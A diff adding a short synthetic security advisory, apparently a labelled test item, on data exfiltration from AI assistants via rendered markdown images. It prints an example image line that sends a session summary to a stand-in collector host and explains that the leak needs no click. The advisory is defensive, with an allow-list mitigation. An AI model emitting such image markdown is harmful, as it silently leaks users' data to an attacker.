@@ -1,0 +1,21 @@
+---
+why: describes the rendered-image exfiltration channel and shows the markdown
+source: synthetic
+hard: true
+---
+Advisory SB-2026-014 — Data exfiltration via rendered markdown images
+
+Any assistant that renders markdown returned by a tool can be made to leak data
+without making a network call itself. The model emits image syntax; the client's
+renderer fetches the URL; the data is in the path.
+
+Example of the pattern (host redacted):
+
+    ![](https://collector.example.invalid/p?d=SESSION_SUMMARY_HERE)
+
+What makes this worse than a link is that nothing is clicked. There is no human
+in the loop to be suspicious, and the request happens as soon as the response
+renders.
+
+Mitigation: restrict image hosts to an allow-list at the gateway, and treat an
+image pointing anywhere else as a high-confidence finding rather than a link.
